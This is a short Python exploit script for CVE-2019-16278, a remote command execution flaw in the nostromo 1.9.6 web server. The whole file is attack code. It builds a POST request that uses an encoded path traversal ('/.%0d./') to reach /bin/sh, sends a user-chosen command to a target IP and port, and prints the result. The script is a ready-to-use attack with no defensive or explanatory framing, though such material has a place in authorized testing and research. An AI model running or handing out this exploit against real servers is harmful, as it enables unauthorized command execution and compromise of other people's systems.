#Exploit: nostromo 1.9.6 - Remote Code Execution
#CVE: CVE-2019-16278
#Author exploit: FredBrave
import sys
import socket
import optparse


def Building_payload(command):
    URL = "/.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0"
    payload= "POST "+URL+"\r\n"
    payload += "Content-Length: 1\r\n\r\n"
    payload += "echo\necho\n"+command+" 2>&1"
    return payload

def exploit(ip, port, command):
    payload = Building_payload(command)
    conexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conexion.connect((ip, int(port)))
    conexion.sendall(payload.encode('utf-8'))
    recive = conexion.recv(options.bytes)
    print(recive)
    conexion.close()

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--ip', dest='ip', help='Ip of target')
    parser.add_option('-p', '--port', dest='port', help='Port where service is running')
    parser.add_option('-c', '--command', dest='command', help='Command to execute')
    parser.add_option('-b', '--bytes', dest='bytes', default=4096, type=int)
    (options, arguments) = parser.parse_args()
    if not options.ip:
        parser.error('[-]Pls indicate de host, Example: -i 10.10.10.10')
    if not options.port:
        parser.error('[-]Pls indicate the port, Example: -p 80')
    if not options.command:
        parser.error('[-]Pls indicate the command to execute: -c "whoami"')
    return options
if __name__ == '__main__':
    options = get_arguments()
    exploit(options.ip, options.port, options.command)

